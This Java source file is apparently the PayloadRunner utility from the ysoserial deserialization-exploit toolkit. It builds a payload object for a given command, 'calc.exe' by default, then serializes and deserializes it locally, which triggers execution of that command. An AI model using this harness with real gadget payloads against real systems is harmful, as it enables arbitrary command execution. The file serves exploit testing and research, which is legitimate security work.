package ysoserial.payloads.util;

import static ysoserial.payloads.util.Serializables.deserialize;
import static ysoserial.payloads.util.Serializables.serialize;
import ysoserial.payloads.ObjectPayload;

/*
 * utility class for running exploits locally from command line
 */
@SuppressWarnings("unused")
public class PayloadRunner {
	public static void run(final Class<? extends ObjectPayload> clazz, final String[] args) {
		try {
			final String command = args.length > 0 && args[0] != null ? args[0] : "calc.exe";
			
			System.out.println("generating payload object(s) for command: '" + command + "'");
			
			final Object objBefore = clazz.newInstance().getObject(command);
			
			System.out.println("serializing payload");
			
			final byte[] serialized = serialize(objBefore);
			
			System.out.println("deserializing payload");
			
			final Object objAfter = deserialize(serialized);
			
		} catch (Exception e) {
			e.printStackTrace();
		}

	}	
	
}
